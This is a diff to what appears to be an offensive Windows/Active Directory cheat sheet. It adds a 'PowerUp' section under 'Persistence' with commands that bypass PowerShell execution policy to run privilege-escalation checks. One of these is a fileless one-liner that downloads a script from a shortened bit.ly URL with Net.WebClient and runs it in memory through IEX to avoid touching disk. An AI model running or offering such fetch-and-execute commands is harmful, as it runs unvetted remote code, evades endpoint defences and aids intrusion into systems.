@@ -163,6 +163,21 @@ Find-LAPSDelegatedGroups
 
 # Persistence
 
+#### PowerUp
+
+```cpp
+powershell.exe -nop -exec bypass
+Import-Module PowerUp.ps1
+Invoke-AllChecks | Out-File -Encoding ASCII Allchecks.txt
+```
+
+If you want to invoke everything without touching disk, use something like this:
+
+```cpp
+powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
+```
+
+
 
 ### Classic Startup folder
 
